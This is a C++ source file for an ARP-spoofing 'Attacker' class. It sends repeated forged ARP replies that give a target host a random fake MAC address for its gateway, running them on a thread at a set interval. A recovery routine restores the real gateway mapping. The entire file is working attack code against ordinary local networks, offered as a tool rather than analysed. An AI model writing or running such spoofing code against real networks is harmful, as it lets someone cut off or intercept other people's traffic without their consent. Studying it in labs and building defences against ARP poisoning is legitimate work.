#include "models/attacker.hpp"
#include "models/host.hpp"
#include "utils/arp_utils.hpp"
#include "utils/mac_utils.hpp"
#include "utils/thread_utils.hpp"

#include <chrono>
#include <iostream>

typedef std::chrono::high_resolution_clock Clock;

Attacker::Attacker(const uint32_t attack_interval_ms) : attack_interval_ms(attack_interval_ms) {}

void Attacker::_attack(const Interface &interface, const Host &target, const Host &gateway) {
    unsigned char buffer[BUF_SIZE];
    struct sockaddr_ll socket_address = Arp::prepare_arp(
        buffer,
        target.get_ip(),
        target.get_mac(),
        gateway.get_ip(),
        fake_mac_address[gateway.get_ip()],
        interface
    );

    Clock::time_point last_attack_time = {}; // set time_point to zero
    while (Thread::spoofing_signal[interface.get_ip()].load(std::memory_order_relaxed)) {
        auto current_time = Clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(current_time - last_attack_time).count();
        if (duration < attack_interval_ms) {
            continue; // wait for some amount of time before the next spoofing packet.
        }

        if (sendto(interface.get_socket_fd(), buffer, 42, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) == -1) {
            std::cerr << "_spoof: Failed to send spoof packet.\n";
        }

        last_attack_time = current_time;
    }
}

void Attacker::attack(const Interface &interface, const Host &target, const Host &gateway) {
    if (fake_mac_address.find(gateway.get_ip()) == fake_mac_address.end()) {
        fake_mac_address[gateway.get_ip()] = Mac::get_random_mac_address();
    }

    Thread::spoofing_thread[target.get_ip()] = std::thread(Attacker::_attack, this, std::ref(interface), std::ref(target), std::ref(gateway));
}

void Attacker::recover(const Interface &interface, const Host &target, const Host &gateway) {
    if (Thread::stop_spoofing_thread(target.get_ip())) {
        unsigned char buffer[BUF_SIZE];
        struct sockaddr_ll socket_address = Arp::prepare_arp(
            buffer,
            target.get_ip(),
            target.get_mac(),
            gateway.get_ip(),
            gateway.get_mac(),
            interface
        );
        
        if (sendto(interface.get_socket_fd(), buffer, 42, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) == -1) {
            std::cerr << "recover: Failed to send recover packet.\n";
        }
    }
}